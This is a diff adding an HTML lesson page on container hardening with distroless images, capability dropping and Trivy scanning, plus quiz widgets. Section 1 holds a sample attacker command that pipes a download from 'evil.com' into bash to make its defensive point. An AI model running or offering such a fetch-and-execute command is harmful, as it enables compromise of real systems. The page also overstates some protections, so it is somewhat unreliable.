@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lesson 07 — Container Security Hardening: Distroless, Capabilities, and Scanning</title>
+<link rel="stylesheet" href="../../../assets/css/tokens.css">
+<link rel="stylesheet" href="../../../assets/css/components.css">
+</head>
+<body class="lesson-body" data-course="docker-containers" data-lesson="7" data-lesson-id="container-security-distroless-scanning">
+
+<div class="readbar"><div class="fill" id="readFill"></div></div>
+<div class="readpill"><span class="dot"></span><span id="readPct">0%</span></div>
+
+<div class="lesson-wrap">
+
+  <div class="lesson-top">
+    <a class="lesson-back" href="../course.html">← Course map</a>
+    <span class="lesson-progress-mini">
+      <span class="track"><i id="miniFill"></i></span>
+      <span id="miniPct">0%</span>
+    </span>
+  </div>
+
+  <span class="lesson-kicker"><span class="n">Lesson 07</span> · Container Hardening</span>
+
+  <h1 class="lesson-title">Container Security Hardening: Distroless, Capabilities, and Scanning</h1>
+  <p class="lesson-lede">
+    Enterprise container security: Distroless base images (GoogleContainerTools), dropping Linux capabilities (`cap-drop ALL`), and image vulnerability scanning (Trivy).
+  </p>
+
+  <div class="lesson-meta">
+    <span><b>Time</b> ~10 min</span>
+    <span><b>Win</b> You know how to harden container images using distroless bases, capability dropping, and automated Trivy scanning.</span>
+    <span><b>Mission link</b> Mastering container security hardening: distroless, capabilities, and scanning across modern software engineering</span>
+  </div>
+
+  <h2><span class="n">1</span>Core principles of Container Security Hardening: Distroless, Capabilities, and Scanning</h2>
+  <p>If an attacker achieves Remote Code Execution (RCE) in an application running on Ubuntu, their first action is running `curl evil.com/malware | bash`. But what if there is <strong>no bash, no sh, no curl, and no package manager inside the container</strong>? The attacker is completely neutralized.</p>
+
+  <div class="note">
+    <span class="note-label">Key idea</span>
+    Enterprise container security: Distroless base images (GoogleContainerTools), dropping Linux capabilities (`cap-drop ALL`), and image vulnerability scanning (Trivy).
+  </div>
+
+  <div id="predict1"></div>
+
+  <h2><span class="n">2</span>Standard Ubuntu vs Distroless Image</h2>
+  <p>Three Pillars of <strong>Container Security Hardening</strong>:</p>
+
+  <div id="diagram1"></div>
+
+  <h2><span class="n">3</span>Linux Capabilities Hardening</h2>
+  <ul><li><strong>1. Distroless Base Images (Google):</strong> <code>gcr.io/distroless/python3</code> contains only Python and essential C-libraries. No `/bin/sh`, no `apt`, no `wget`. If an attacker exploits a code vulnerability, they cannot launch a shell or download binaries!</li><li><strong>2. Dropping Linux Kernel Capabilities (`--cap-drop ALL`):</strong> By default, Linux containers possess capabilities like `CAP_CHOWN` and `CAP_NET_RAW`. Dropping all capabilities and adding back only what is needed prevents container escape exploits: <code>--cap-drop ALL --cap-add NET_BIND_SERVICE</code>.</li><li><strong>3. Automated Vulnerability Scanning in CI (Trivy / Docker Scout):</strong> Scan container images in GitHub Actions before pushing to production registries. Trivy scans OS packages and Python wheels against CVE databases, blocking images with Critical vulnerabilities!</li></ul><pre><code># Running an Automated Container Security Scan with Trivy in CI:
+# (GitHub Actions step)
+- name: Scan Image for Vulnerabilities
+  uses: aquasecurity/trivy-action@master
+  with:
+    image-ref: 'company/production-api:latest'
+    format: 'table'
+    exit-code: '1' # Fails the build if CRITICAL vulnerabilities exist!
+    severity: 'CRITICAL,HIGH'</code></pre><div class="callout"><p><strong>The Distroless Rule:</strong> If an application does not need a shell to run in production, do not include a shell in the container. Attackers cannot spawn what does not exist.</p></div>
+
+  <div id="trace1"></div>
+
+  <h2><span class="n">4</span>Practice</h2>
+  <p>Complete the container hardening sentence</p>
+
+  <div id="fill1"></div>
+
+  <div class="win">
+    <h3>✓ Your win for today</h3>
+    <p>You know how to harden container images using distroless bases, capability dropping, and automated Trivy scanning.</p>
+  </div>
+
+  <h2><span class="n">5</span>Do this next</h2>
+  <ol>
+    <li>Audit your project code and identify where container security hardening: distroless, capabilities, and scanning applies.</li>
+    <li>Author a unit test or verification script exercising container security hardening: distroless, capabilities, and scanning.</li>
+    <li>Document team architectural conventions regarding container security hardening: distroless, capabilities, and scanning.</li>
+  </ol>
+
+  <div class="note">
+    <span class="note-label">Primary source</span>
+    Industry standards and best practices for Container Security Hardening: Distroless, Capabilities, and Scanning.
+  </div>
+
+  <div class="ask-teacher">
+    <b>Stuck, or curious?</b> Ask your teacher — there are no bad questions here.
+  </div>
+
+  <div id="quiz"></div>
+
+  <div id="lessonNav"></div>
+
+  <div class="course-map">
+    <h3>Course map</h3>
+    <div id="courseMap"></div>
+  </div>
+
+</div>
+
+<script src="../../../assets/js/icons.js"></script>
+<script src="../lessons.js"></script>
+<script src="../../../assets/js/teach/lesson-engine.js"></script>
+<script src="../../../assets/js/teach/quiz.js"></script>
+<script src="../../../assets/js/teach/widgets.js"></script>
+<script>
+  TeachWidgets.predict("#predict1", {
+    q: "What is a 'Distroless' container image, and why does it represent the pinnacle of container security?",
+    a: ["An image that contains only the application and its runtime dependencies, containing ZERO package managers (apt), ZERO shells (bash/sh), and ZERO OS utilities","An image that runs without a computer","An image without a Dockerfile","A broken Linux distribution"],
+    c: 0,
+    why: "Distroless images contain no shells, package managers, or utilities, making it nearly impossible for attackers to run shell scripts or tools."
+  });
+
+  TeachWidgets.diagram("#diagram1", {
+    boxes: [
+      {
+            "title": "Standard Ubuntu Image (Vulnerable)",
+            "lines": [
+                  "Includes bash, sh, apt, curl, python",
+                  "Size: 600MB+ | 40+ known CVEs",
+                  "Attacker can download and run rootkits"
+            ]
+      },
+      {
+            "title": "Google Distroless Image (Hardened)",
+            "lines": [
+                  "Contains ONLY python binary and app code",
+                  "Zero shells (/bin/sh deleted!), zero apt",
+                  "Size: 50MB | Near-zero CVEs | Shell exploits fail!"
+            ]
+      }
+]
+  });
+
+  TeachWidgets.trace("#trace1", {
+    code: [
+      "# Tracing Container Security Hardening: Distroless, Capabilities, and Scanning",
+      "def execute_flow():",
+      "    # Enterprise container security: Distroless base ima...",
+      "    return True"
+],
+    steps: [
+      {
+            "line": 1,
+            "vars": {
+                  "phase": "Initialize",
+                  "concept": "Container Security Hardening: Distroless, Capabilities, and Scanning"
+            }
+      },
+      {
+            "line": 2,
+            "vars": {
+                  "phase": "Execution",
+                  "state": "Active"
+            }
+      },
+      {
+            "line": 4,
+            "vars": {
+                  "phase": "Result",
+                  "status": "Success"
+            }
+      },
+      {
+            "line": 1,
+            "vars": {
+                  "step": "--cap-drop ALL"
+            }
+      },
+      {
+            "line": 2,
+            "vars": {
+                  "step": "--cap-add NET_BIND_SERVICE"
+            }
+      }
+]
+  });
+
+  TeachWidgets.fill("#fill1", {
+    label: "From memory — fill in the core terms",
+    lines: [
+      "Google {1} container images contain zero shells and package managers to defeat attackers, while automated {2} scans block images with critical CVEs in CI."
+],
+    blanks: [
+      {
+            "a": [
+                  "distroless"
+            ],
+            "why": "Images containing only runtime without OS utilities"
+      },
+      {
+            "a": [
+                  "Trivy"
+            ],
+            "why": "Open-source container vulnerability scanner"
+      }
+]
+  });
+
+  TeachQuiz.mount("#quiz", [
+    {
+      q: "What happens if an attacker achieves Remote Code Execution (RCE) in a Distroless container image?",
+      a: ["The attacker cannot spawn an interactive shell (e.g. /bin/bash or /bin/sh) or download external malware tools because no shells or package managers exist in the image","The host computer shuts down","The attacker gains root access immediately","The container deletes the internet"],
+      c: 0,
+      why: "Distroless images lack shells and package managers, preventing attackers from spawning interactive shell sessions."
+    },
+    {
+      q: "What open-source tool is the industry standard for scanning container images for vulnerabilities in CI/CD pipelines?",
+      a: ["Trivy (by Aqua Security)","Git","React","WordPress"],
+      c: 0,
+      why: "Trivy is a fast, comprehensive security scanner for container images, filesystems, and Git repositories."
+    },
+    {
+      q: "What does the '--cap-drop ALL' Docker flag do?",
+      a: ["It revokes all default Linux root capabilities (like raw packet creation or ownership modifications) from the container's processes","It makes the container run in all-caps","It deletes all files","It turns off the CPU"],
+      c: 0,
+      why: "--cap-drop ALL removes all discretionary kernel capabilities, strictly confining container privileges."
+    },
+    {
+      q: "Why is scanning third-party base images (like python:3.12 or node:20) necessary before using them in production?",
+      a: ["Upstream base images regularly accumulate unpatched operating system vulnerabilities (CVEs) that must be updated or patched","Base images expire after 30 days","Base images are copyright protected","It is required by Python syntax"],
+      c: 0,
+      why: "Regular scanning ensures that upstream base image vulnerabilities are caught and updated promptly."
+    }
+  ]);
+</script>
+</body>
+</html>
